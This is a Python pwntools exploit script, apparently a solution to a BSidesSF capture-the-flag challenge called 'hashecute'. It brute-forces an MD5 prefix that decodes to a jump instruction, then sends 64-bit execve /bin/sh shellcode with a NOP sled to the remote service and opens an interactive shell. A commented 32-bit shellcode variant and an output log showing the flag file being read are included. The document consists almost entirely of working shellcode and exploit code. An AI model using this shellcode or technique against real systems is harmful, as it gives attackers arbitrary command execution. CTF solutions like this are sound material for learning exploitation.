
from pwn import *
import base64
import re
import hashlib

conn = remote('hashecute-9b16b5b9.ctf.bsidessf.net', 2525)

#32bit
#shell = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

#64bit
shell ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

count = 0
while 1:
    shell_a = shell+str(count)
    m = hashlib.md5()
    m.update(shell_a)
    hash = m.digest()
    print hash.encode("hex")[0:4]
    if hash.encode("hex")[0:4] == "eb10":
        break
    count +=1

asm =""

for i in m.digest():
    asm += hex(ord(i)).replace("0x","\\x")

print asm

send_line = hash+shell_a

line =conn.recvuntil("Send me stuff!!\n")
print line
log.info("[+]send this line: "+send_line)
conn.send(send_line)

conn.interactive()


'''
9cc6
f50b
b818
459c
eb10
\xeb\x10\x57\x9d\x4f\x6c\x34\x2\xfe\x0\x63\xfb\x9e\x17\xb0\xe3
Send me stuff!!

[*] [+]send this line: �W\x9dOl4\xfe\x00c����\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901�H\xbbѝ\x96\x91Ќ\x97\xffH��ST_\x99RWT^\xb0;\x0f\x057801
[*] Switching to interactive mode
$ cat /home/ctf/flag.txt
FLAG:74b931a6a99f8c7a65a53fb5bc1afe16
[*] Got EOF while reading in interactive
$
'''
